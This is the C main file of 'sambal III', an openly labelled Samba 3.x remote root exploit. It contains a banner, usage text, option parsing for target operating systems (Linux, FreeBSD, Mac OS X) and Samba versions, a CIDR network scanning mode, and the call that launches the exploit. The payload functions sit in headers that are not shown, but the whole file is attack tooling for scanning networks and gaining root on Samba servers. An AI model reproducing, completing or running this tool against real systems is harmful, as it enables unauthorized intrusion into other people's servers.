/*  
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)
  
*/


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>

#include "session.h"

#include "main.h"
#include "ansi.h"
#include "exploit_samba.h"
#include "mode.h"
#include "scan.h"
#include "smb_funct.h"
#include "wrapper.h"

void
banner()
{

        fprintf(stdout, LG"  .oooooo..o"DG"                              .o8                 "LG"oooo \r\n"
                        LG" d8P'    `Y8"DG"                             \"888                 "LG"`888 \r\n"
                        LG" Y88bo."DG"       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    "LG"888 \r\n"
                        LG"  `\"Y8888o."DG"  `P  )88b  `888P\"Y88bP\"Y88b   d88' `88b `P  )88b   "LG"888 \r\n"
                        LG"      `\"Y88b"DG"  .oP\"888   888   888   888   888   888  .oP\"888   "LG"888 \r\n"
                        LG" oo     .d8P"DG" d8(  888   888   888   888   888   888 d8(  888   "LG"888 \r\n"
                        LG" 8\"\"88888P'"DG"  `Y888\"\"8o o888o o888o o888o  `Y8bod8P' `Y888\"\"8o "LG"o888o\r\n\r\n"NO);

        fprintf(stdout, GR"["LG"!"GR"]" LG" sambal III: samba 3.x.x remote root exploit"DG" by eSDee(esdee@netric.org)\r\n"NO);
        fflush(stdout);

        return;
}

void
display_usage(const char *program_name)
{
        fprintf(stderr, "\r\n"
                        "Usage: %s [-cdinpPsv] <-t>  [host|network]                  \r\n\r\n"
                        "-c                     Keep terminal into cooked mode.          \r\n"
                        "-d <device>            Scanning device. (default: eth0)         \r\n"
                        "-i                     Gather information and exit.             \r\n"
                        "-n                     Use NBT (port 139)                       \r\n"
                        "-p <Port>              Use an arbitrary port.                   \r\n"
                        "-s <Type>              Scanning mode. Use type: NBT or SMB.     \r\n"
                        "-t <Type>              Target operating system. (Use 0 for a list of the available targets)\r\n"
                        "-v                     Verbose mode.                            \r\n"
                        "\r\n", 
                        
                        program_name);
        fflush(stderr);

        exit(EXIT_FAILURE);
}

void
parse_options(struct SMB_session *session, int argc, char *argv[])
{
        char scan_opt[1024];

        int i           = 0;
        int opt         = 0;
        int target      = 0;

        time_out                = DEFAULT_TIMEOUT;

        memset(session, '\0', sizeof(struct SMB_session));
        
        session->device = xstrdup(DEFAULT_DEVICE);

        while((opt = getopt(argc, argv, "cd:inp:u:s:t:v"))!= EOF) {

                switch(opt) {
                        case 'c':
                                SET_MODE(MODE_COOKED);
                                break;

                        case 'd':
                                session->device = xstrdup(optarg);
                                break;

                        case 'i':
                                SET_MODE(MODE_INFO);
                                break;

                        case 'n':
                                SET_MODE(MODE_NBT);
                                break;

                        case 'p':
                                SET_MODE(MODE_MANUAL_PORT);

                                session->port = atoi(optarg);

                                if ((session->port < 0) || (session->port > 65535)) {
                                        fprintf(stderr, "%s: Invalid port.\r\n", argv[0] == NULL ? NAME : argv[0]);
                                        exit(EXIT_FAILURE);
                                }

                                break;

                        case 's':
                                SET_MODE(MODE_SCAN);

                               memset(scan_opt, '\0', sizeof(scan_opt));
                                strncpy(scan_opt, optarg, sizeof(scan_opt) - 1);

                                for (i = 0; i < strlen(scan_opt); i++)
                                        *(scan_opt + i) = toupper(*(scan_opt + i));

                                if (!strncmp(scan_opt, "SMB", 3)) {
                                        SET_MODE(MODE_SMB);
                                } else if (!strncmp(scan_opt, "NBT", 3)) {
                                        SET_MODE(MODE_NBT);
                                } else {
                                        fprintf(stderr, "%s: Invalid scan option\r\n"
                                                        "Use -s NBT or SMB\r\n", NAME);
                                        exit(EXIT_FAILURE);
                                }

                                break;
                        case 't':
                                target = atoi(optarg);

                                if (!target || target > 6) {
                                        fprintf(stderr, "\r\n"
                                                        DG"1. "GR"["LG"ia32 Linux    "GR"] "DG"findsck_pty_alloc "GR"["LG"samba 3.2.x, 3.3.x, 3.4.x"GR"]"NO"\r\n"
                                                        DG"2. "GR"["LG"ia32 Linux    "GR"] "DG"findsck_pty_alloc "GR"["LG"samba 3.0.25 and higher  "GR"] (unreliable)"NO"\r\n"
                                                        DG"3. "GR"["LG"ia32 FreeBSD  "GR"] "DG"findsck           "GR"["LG"samba 3.2.x, 3.3.x, 3.4.x"GR"]"NO"\r\n"
                                                        DG"4. "GR"["LG"ia32 FreeBSD  "GR"] "DG"findsck           "GR"["LG"samba 3.0.25 and higher  "GR"] (unreliable)"NO"\r\n"
                                                        DG"5. "GR"["LG"ia32 Mac OS X "GR"] "DG"findsck           "GR"["LG"samba 3.2.x, 3.3.x, 3.4.x"GR"]"NO"\r\n"
                                                        DG"6. "GR"["LG"ia32 Mac OS X "GR"] "DG"findsck           "GR"["LG"samba 3.0.25 and higher  "GR"] (unreliable)"NO"\r\n"
                                                        "\r\n");
                                        exit(EXIT_FAILURE);                             
                                }

                                if (target == 1) {
                                        SET_MODE(MODE_LINUX);
                                } else if (target == 2) {       
                                        SET_MODE(MODE_LINUX); 
                                        SET_MODE(MODE_OLD_SAMBA);
                                } else if (target == 3) {
                                        SET_MODE(MODE_FREEBSD);
                                } else if (target == 4) {
                                        SET_MODE(MODE_FREEBSD);
                                        SET_MODE(MODE_OLD_SAMBA);
                                } else if (target == 5) {
                                        SET_MODE(MODE_MACOS);
                                } else if (target == 6) {
                                        SET_MODE(MODE_MACOS);
                                        SET_MODE(MODE_OLD_SAMBA);                               
                                }

                                break;  
                
                        case 'v':
                                SET_MODE(MODE_VERBOSE);
                                break;

                        default:
                                display_usage(argv[0] == NULL ? NAME : argv[0]);
                }
        }

        if (!target && !MODE_IS_SET(MODE_SCAN)) 
                display_usage(argv[0] == NULL ? NAME : argv[0]);

        if (!argv[optind]) 
                display_usage(argv[0] == NULL ? NAME : argv[0]);

        session->hostname = xstrdup(argv[optind]);

        return;
}

int
main(int argc, char *argv[])
{
        struct SMB_session session;

        unsigned char *network  = NULL;
        unsigned char *mask     = NULL;

        banner();

        parse_options(&session, argc, argv);

        if (!MODE_IS_SET(MODE_NBT)) 
                SET_MODE(MODE_SMB);      

        if (MODE_IS_SET(MODE_SCAN)) {

                if ((network = strtok(argv[optind], "/")) == NULL) {
                        fprintf(stderr, "%s: Invalid network/cidr.\r\n", argv[0] == NULL ? NAME : argv[0]);
                        exit(EXIT_FAILURE);
                }

                if ((mask = strtok(NULL, "/")) == NULL) {
                        fprintf(stderr, "%s: Invalid network/cidr.\r\n", argv[0] == NULL ? NAME : argv[0]);
                        exit(EXIT_FAILURE);
                }

                SMB_scan_network(&session, network, atoi(mask));
                exit(EXIT_SUCCESS);
        }

        exploit_samba(&session);

        SMB_free_session(&session);

        return 0;
}
